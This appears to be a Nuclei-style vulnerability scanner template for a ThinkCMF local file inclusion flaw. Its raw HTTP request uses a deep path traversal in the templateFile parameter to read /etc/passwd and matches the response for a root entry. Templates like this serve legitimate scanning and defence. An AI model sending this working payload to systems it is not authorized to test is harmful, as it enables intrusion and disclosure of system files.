id: thinkcmf-lfi1
info:
  author: pikpikcu
  name: ThinkCMF LFI
  reference: https://www.freebuf.com/vuls/217586.html
  severity: high
  tags: thinkcmf,lfi
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    - bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
